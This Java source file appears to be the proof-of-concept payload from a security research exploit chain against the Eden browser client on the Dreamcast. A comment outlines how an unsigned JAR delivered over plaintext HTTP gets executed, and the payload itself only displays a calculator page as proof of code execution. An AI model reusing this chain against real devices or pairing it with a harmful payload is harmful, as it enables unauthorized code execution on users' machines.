package org.junkyard;

import com.planetweb.eden.client.service.Service;
import com.planetweb.eden.client.service.ServiceInfo;
import com.planetweb.eden.client.Eden;

/**
 * CHAIN "calc": the Eden service-subscription RCE (Bug #1) delivering a benign,
 * unmistakable proof-of-code-execution -- a working AWT calculator on the Dreamcast.
 *
 * Same design-flaw chain as "splash" (DNS -> login -> discovery -> subscribe ->
 * unsigned JAR over plaintext HTTP -> JarClassLoader.newInstance().run(), no
 * SecurityManager). No memory corruption, no overflow, no staging -- opening the
 * connection is enough. run() just constructs our Calculator Frame and shows it.
 */
public class CalcService extends Service {

    public ServiceInfo getInfo() {
        return new ServiceInfo("JunkyardCalc", "1.0", "DistrictCon", Junk.BASE);
    }

    public void run() {
        Junk.banner("CHAIN calc -- arbitrary code execution: rendering a calculator");
        Junk.prove();
        // Reliable proof first: navigate the browser's native HTML renderer to our own
        // page. This is the same openURL the working splash chain uses -- it always shows,
        // where a service-owned AWT Frame does not composite over the browser view.
        Junk.openURL(Junk.BASE + "/calc.html");
        Eden.println("[+] navigated to /calc.html (code execution proven)");
        // Bonus: also try the interactive AWT calculator. If the VM ever composites it, great;
        // if not, the page above is what the audience sees. Never let it break the proof.
        try { new Calculator(); Eden.println("[+] AWT Calculator constructed"); }
        catch (Throwable t) { Eden.println("[i] AWT Calculator not shown: " + t); }
    }
}
